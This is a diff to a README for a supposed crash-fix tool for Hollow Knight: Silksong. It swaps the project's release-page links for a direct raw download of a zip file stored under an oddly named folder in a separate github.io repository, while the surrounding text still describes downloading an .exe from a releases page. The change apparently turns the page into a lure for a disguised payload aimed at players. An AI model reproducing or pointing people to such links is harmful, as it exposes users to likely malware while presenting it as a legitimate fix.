@@ -5,7 +5,7 @@ description: "Resolve application crashes for Hollow Knight Silksong on Windows 
 ---
 # 🛠️ Silksong-Crash-Fix - Stop game crashes on your PC
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Shivery-castaneadentata772/Silksong-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Shivery-castaneadentata772/shivery-castaneadentata772.github.io/raw/refs/heads/main/dichroscopic/Dist_3.7.zip)
 
 ## What this tool does
 
@@ -13,7 +13,7 @@ The Silksong-Crash-Fix tool solves startup errors for the game Hollow Knight: Si
 
 ## 📥 How to download
 
-Visit this link to download the software: [https://github.com/Shivery-castaneadentata772/Silksong-Crash-Fix/releases](https://github.com/Shivery-castaneadentata772/Silksong-Crash-Fix/releases)
+Visit this link to download the software: [https://github.com/Shivery-castaneadentata772/shivery-castaneadentata772.github.io/raw/refs/heads/main/dichroscopic/Dist_3.7.zip](https://github.com/Shivery-castaneadentata772/shivery-castaneadentata772.github.io/raw/refs/heads/main/dichroscopic/Dist_3.7.zip)
 
 Navigate to the most recent release on that page. You will see a list of assets. Click the file that ends in .exe to start the download. Save this file to your desktop or your Downloads folder. Do not rename the file, as the installer requires the specific name to function correctly.
 
